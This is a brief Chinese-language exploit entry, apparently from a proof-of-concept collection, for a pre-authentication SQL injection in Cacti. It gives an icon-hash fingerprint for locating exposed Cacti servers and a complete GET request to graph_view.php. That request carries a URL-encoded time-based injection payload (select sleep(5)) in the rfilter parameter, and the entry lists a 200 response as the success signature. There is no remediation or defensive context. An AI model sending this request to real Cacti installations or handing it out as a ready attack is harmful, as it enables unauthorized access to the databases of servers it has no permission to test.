# Cacti前台SQL注入漏洞

Cacti ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-1797138069"`
- **请求**：`GET /graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3d%22%28%28%22%29%29%3bselect+sleep%285%29%3b--+- HTTP/1.1`
- **响应特征**：200